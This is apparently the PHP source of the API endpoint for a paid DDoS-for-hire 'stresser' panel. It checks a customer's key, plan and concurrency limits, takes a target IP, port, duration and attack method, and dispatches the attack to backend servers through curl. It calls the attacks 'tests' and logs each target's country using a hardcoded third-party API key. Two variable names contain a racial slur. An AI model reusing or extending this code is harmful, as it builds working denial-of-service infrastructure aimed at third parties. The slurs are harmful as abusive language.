<!DOCTYPE html>
<!--[if IE 9]>         <html class="no-js lt-ie10"> <![endif]-->
<!--[if gt IE 9]><!--> <html class="no-js"> <!--<![endif]-->
    <head>
        <meta charset="utf-8">
        <title><?php echo $settings['bootername_1'] ?> - <?php echo $page ?></title>
        <meta name="description" content="">
        <meta name="author" content="Edited By @Hexedfull">
        <meta name="robots" content="noindex, nofollow">
        <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1.0">
        <link rel="shortcut icon" href="img/favicon.png">
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
        <link rel="apple-touch-icon" href="img/icon57.png" sizes="57x57">
        <link rel="apple-touch-icon" href="img/icon72.png" sizes="72x72">
        <link rel="apple-touch-icon" href="img/icon76.png" sizes="76x76">
        <link rel="apple-touch-icon" href="img/icon114.n" sizes="114x114">
        <link rel="apple-touch-icon" href="img/icon120.png" sizes="120x120">
        <link rel="apple-touch-icon" href="img/icon144.png" sizes="144x144">
        <link rel="apple-touch-icon" href="img/icon152.png" sizes="152x152">
        <link rel="stylesheet" href="css/bootstrap.min.css">
        <link rel="stylesheet" href="css/plugins.css">
        <link rel="stylesheet" href="css/main.css">
<body bgcolor="#000000">
<font color="white">CRITICAL API <strong style='color:#009dff;'>V2</strong> BY :	<font style="font-weight: bold;" color="red">@HEXEDFULL</font></font><br>
</body>
<?php
if ($settings['cloudflare_set'] == '1') {
    $ip = $_SERVER["HTTP_CF_CONNECTING_IP"];
} else {
    $ip = $_SERVER['REMOTE_ADDR'];
}
$nameofthesite = $settings['bootername_1'] . $settings['bootername_2'];
if(isset($_GET['key']))
{
	$SQL = $odb -> prepare("SELECT `membership` FROM `users` WHERE `apikey` = :apikey");
$SQL -> execute(array(':apikey' => $_GET["key"]));
$expire = $SQL -> fetchColumn(0);
$SQLO = $odb -> prepare("SELECT `apiaccess` FROM `plans` WHERE `ID` = :id");
$SQLO -> execute(array(':id' => $expire));
$apiaccess = $SQLO -> fetchColumn(0);
if ($apiaccess == "N") { die("<font color='red'><strong>YOU DONT HAVE API ACCESS PURCHASE A PLAN WITH API ACCESS TO USE IT :)</strong></font>"); }
	if(!empty($_GET['key']))
	{
		// Store the key into a variable
		$key = $_GET['key'];
		
		// Fetch the user who owns the key specified
		$FetchUserSQL = $odb -> prepare("SELECT * FROM `users` WHERE `apikey` = ?");
		$FetchUserSQL -> execute(array($key));
		$FetchedUser = $FetchUserSQL -> fetch(PDO::FETCH_ASSOC);
		
		if($FetchedUser){

 $checkprior = $odb->prepare("SELECT COUNT(*) FROM logs WHERE user = ? AND `date` > ?");
        $checkprior->execute(array($FetchedUser['username'], time() - 900));
        if($checkprior->fetchColumn() > 20){
            die("<font color='red'>Dear ".$FetchedUser['username'].", You have attempted to spam the servers please wait 15min to attack again</font>");
        }
			if(isset($_GET['update'])){
			
				if($FetchedUser['code_account'] == $_GET['update']){
					$upd = $odb->prepare("UPDATE users SET ip_address_api = ? WHERE key = ?");
					$upd->execute(array($ip, $_GET['key']));
					echo "<font color='red'>Updated Your IP Address</font>";
					die;
				}
				else
				{
					
				die("Wrong Password");
				}
			}
			$SQLX = $odb -> prepare("SELECT `whiteliston` FROM `users` WHERE `apikey` = :APIKEY");
			$SQLX -> execute(array(':APIKEY' => $_GET["key"]));
			$wlstatus = $SQLX -> fetchColumn(0);
			if ($wlstatus == "Y") {
			$SQLO = $odb -> prepare("SELECT `api_ips` FROM `users` WHERE `apikey` = :APIKEY");
			$SQLO -> execute(array(':APIKEY' => $_GET["key"]));
			$ipsm = $SQLO -> fetchColumn(0);
			if( strpos( $ipsm, $_SERVER['REMOTE_ADDR'] ) !== false ) {
			
			} else {
				die("<font color='red'><strong>Your IP isn't authorized to use this API, please Whitelist it in our API Manager!</strong></font>");
			}
			}
				   if($FetchedUser['ip_address_api'] == "OFF"){
        }elseif($FetchedUser['ip_address_api'] != $ip){
				echo "<font color='red'>IP Address Does Not Match The Same On The Database. To update this do &key=".$key."&update= < Your 5 digit code you created when you first signed up with us</font>";
				die;
			}
			$host = $_GET['host'];
			$port = intval($_GET['port']);
			$time = intval($_GET['time']);
			$method = $_GET['method'];
			$SQLO = $odb -> prepare("SELECT `rank` FROM `users` WHERE `apikey` = :APIKEY");
			$SQLO -> execute(array(':APIKEY' => $_GET['key']));
			$rankO = $SQLO -> fetchColumn(0);
			if ($rankO < 2) {
			$SQL = $odb -> prepare("SELECT `adminonly` FROM `methods` WHERE `name` = :NAME");
			$SQL -> execute(array(':NAME' => $method));
			$expire = $SQL -> fetchColumn(0);
			if ($expire == "Y") { die("You can't use that method!"); }
			}
			if(empty($host) || empty($port) || empty($time) || empty($method))
			{
				die("<font color='red'>PLEASE FILL IN ALL FIELDS!</font> <font color='white'>Try: https://criticalstresser.com/Panel/index.php?page=Api&key=[key]host=[host]&port=[port]&time=[time]&method=[method]</font>");
			}
			
			if(!filter_var($host, FILTER_VALIDATE_IP))
			{
				die("<font color='red'>That is not a valid IP Address.</font><font color='white'> - ".$settings['bootername_1']."</font>");
			}
			
			if($host == "127.0.0.1") die("<font color='white'>You cannot Test a local IP. - ".$settings['bootername_1']."</font>");
		

$SQLCHECKMethods = $odb -> prepare("SELECT COUNT(*) FROM `methods` WHERE `name` = ?");
$SQLCHECKMethods -> execute(array($method));

$countMethods = $SQLCHECKMethods -> fetchColumn(0);

                if($countMethods > 0){
				$SQLCheckBlacklist = $odb -> prepare("SELECT COUNT(*) FROM `blacklist` WHERE `IP` = :host");
				$SQLCheckBlacklist -> execute(array(':host' => $host));
				$countBlacklist = $SQLCheckBlacklist -> fetchColumn(0);
				if($countBlacklist > 0)
				{
					die("This IP Address is currently blacklisted. - , ".$settings['bootername_1']."");
				}
				else
				{
				 		$SQL = $odb->prepare("SELECT COUNT(*) FROM `logs` WHERE `ip` = :ip AND `time` + `date` > UNIX_TIMESTAMP() AND `stopped` = 0");
                                                $SQL->execute(array(
                                                ':ip' => $host
                                                ));
						if ($SQL->fetchColumn(0) > 0) {
                                                    $ilovefanta = "NEGRO";
                                                die("<font color='red'>Test On This Host Is Already In Progress</font><font color='white'> - ".$settings['bootername_1']."</font>");
                                                }
                                                $checkRunningSQLtest = $odb -> prepare("SELECT COUNT(*) FROM `logs` WHERE `ip` = :ip AND `time` + `date` > UNIX_TIMESTAMP()");
						$countRunningtest = $checkRunningSQLtest -> fetchColumn(0);
						if($countRunningtest > 0){
						die("<font color='red'>TESTING</font><font color='white'> - ".$settings['bootername_1']."</font>");
						}
							
				}
				$checkRunningSQL = $odb -> prepare("SELECT COUNT(*) FROM `logs` WHERE `user` = :username  AND `time` + `date` > UNIX_TIMESTAMP()");
				$checkRunningSQL -> execute(array(':username' => $FetchedUser['username']));
				$countRunning = $checkRunningSQL -> fetchColumn(0);
								
				$SQLGetConcurrent = $odb -> prepare("SELECT `plans`.`concurrent` FROM `plans` LEFT JOIN `users` ON `users`.`membership` = `plans`.`ID` WHERE `users`.`apikey` = :key");
				$SQLGetConcurrent -> execute(array(':key' => $key));
				$userConcurrent = $SQLGetConcurrent -> fetchColumn(0);
				
				if($countRunning < $userConcurrent)
				{
					$SQLGetTime = $odb -> prepare("SELECT `plans`.`mbt` FROM `plans` LEFT JOIN `users` ON `users`.`membership` = `plans`.`ID` WHERE `users`.`apikey` = :key");
					$SQLGetTime -> execute(array(':key' => $key));
					$maxTime = $SQLGetTime -> fetchColumn(0);
					if(!($time > $maxTime))
					{
							$getServer = $odb -> prepare("SELECT * FROM `servers` WHERE (`lastUsed` < UNIX_TIMESTAMP() AND `lastUsed` != 0) ORDER BY RAND() LIMIT 1");
							$getServer -> execute();
							$serverFetched = $getServer -> fetch(PDO::FETCH_ASSOC);

							$getServerName = $odb -> prepare("SELECT `name` FROM `servers` WHERE (`lastUsed` < UNIX_TIMESTAMP() AND `lastUsed` != 0) ORDER BY RAND() LIMIT 1");
							$getServerName -> execute();
							$serverName = $getServerName -> fetchColumn(0);
                                                        
						  {
                                                                if($settings['rotation'] == "1")
                                                                {
                                                                    //Rotation
                                                                    $urlnigga = $serverFetched['url'];
                                                                    $arrayFind = array('[host]', '[port]', '[time]', '[method]');
                                                                    $arrayReplace = array($host, $port, $time, $method);
                                                                    for($i = 0; $i < count($arrayFind); $i++)
                                                                    $urlnigga = str_replace($arrayFind[$i], $arrayReplace[$i], $urlnigga);
                                                                    $ch = curl_init();
                                                                    curl_setopt($ch, CURLOPT_URL, $urlnigga);
                                                                    curl_setopt($ch, CURLOPT_HEADER, 0);
                                                                    curl_setopt($ch, CURLOPT_NOSIGNAL, 1);
                                                                    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                                                                    curl_setopt($ch, CURLOPT_TIMEOUT, 1);
                                                                    curl_exec($ch);
                                                                    curl_close($ch);
                                                                    
$serverNameLog .= $serverFetched['name'] . " Api System";
                                                                    $good = 1;
                                                                }else{
                                                                	      //All Servers At Once
                                                                    $getallservers = $odb -> prepare("SELECT * FROM servers ORDER BY ID ASC");
                                                                    $getallservers -> execute();

                                                                    while ($allservers = $getallservers -> fetch(PDO::FETCH_ASSOC)){
                                                                        $urlservers = $allservers['url'];
                                                                        $arrayFind = array('[host]', '[port]', '[time]', '[method]');
                                                                        $arrayReplace = array($host, $port, $time, $method);

                                                                        for($i = 0; $i < count($arrayFind); $i++)
                                                                        $urlservers = str_replace($arrayFind[$i], $arrayReplace[$i], $urlservers);

                                                                        $ch = curl_init();
                                                                        curl_setopt($ch, CURLOPT_URL, $urlservers);
                                                                        curl_setopt($ch, CURLOPT_HEADER, 0);
                                                                        curl_setopt($ch, CURLOPT_NOSIGNAL, 1);
                                                                        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                                                                        curl_setopt($ch, CURLOPT_TIMEOUT, 1);
                                                                        curl_exec($ch);
                                                                        curl_close($ch);

                                                                        $good = 1;
                                                                        $serverNameLog .= $allservers['name'] . "||";
                                                                    }
                                                                }
                                                            }
                                                            if($good == 1)
                                                            {
							$clientip = $_SERVER['REMOTE_ADDR'];						
							$updateServer = $odb -> prepare("UPDATE `servers` SET `lastUsed` = UNIX_TIMESTAMP()+:time WHERE `name` = :name");
							$updateServer -> execute(array(':name' => $serverName, ':time' => $time));
							$xml = simplexml_load_file('http://api.ipinfodb.com/v3/ip-city/?key=a69c934a779933e7a2427abceb2568d1f81b1181daa428e4c0dd5e32277f5fb8&format=xml&ip='.$host);
							$country = $xml->countryName;
							$dayx = date('d');
                            $insertLogSQL = $odb -> prepare("INSERT INTO `logs` VALUES(NULL, ?, ?, ?, ?, ?, ?, ?, UNIX_TIMESTAMP(), ?, ?, ?, ?)");
							$insertLogSQL -> execute(array($FetchedUser['username'], $host, $_SERVER['REMOTE_ADDR'], $port, $time, $time, $method, $serverNameLog, "0", $country, $dayx));
							echo '<font color="green">SUCCESS TEST HAS BEEN SENT TO HOST: <font color="white">'.$host.'</font> PORT:'.$port.' FOR <font color="#009dff">'.$time.' SECONDS </font> USING PROTOCOL: <font color="red">'.$method.'</font>';
							exit();
						}
					}
					else
	{
		die("<font color='red'>You dont have that many seconds, ".$settings['bootername_1']."</font>");
	}
				}
				else
				{
					die("<font color='red'>You have reached the max concurrents for your plan. - ".$settings['bootername_1']."</font>");
				}
			}
			else
			{
				echo '<font color="blue">=====Methods=====<br></font>';
$getMethods = $odb -> prepare("SELECT * FROM methods");
$getMethods -> execute(array());
while ($methodsFetched = $getMethods -> fetch(PDO::FETCH_ASSOC))
{
echo '<font color="red">'.$methodsFetched["tag"].' ('.$methodsFetched["type"].')</font><br>';
}

				echo '<font color="blue">=====Methods=====<br></font>';
die("<font color='red'>Invalid method, available methods listed above</font>");
			}
		}
		else
		{
			die("<font color='red'>Invalid Key Specified. - ".$settings['bootername_1']."</font>");
		}
	}
	else
	{
		die("<font color='red'>No key specified. - ".$settings['bootername_1']."</font>");
	}
}
else
{
	die("<font color='red'No key specified. - ".$settings['bootername_1']."</font>");
}
?>

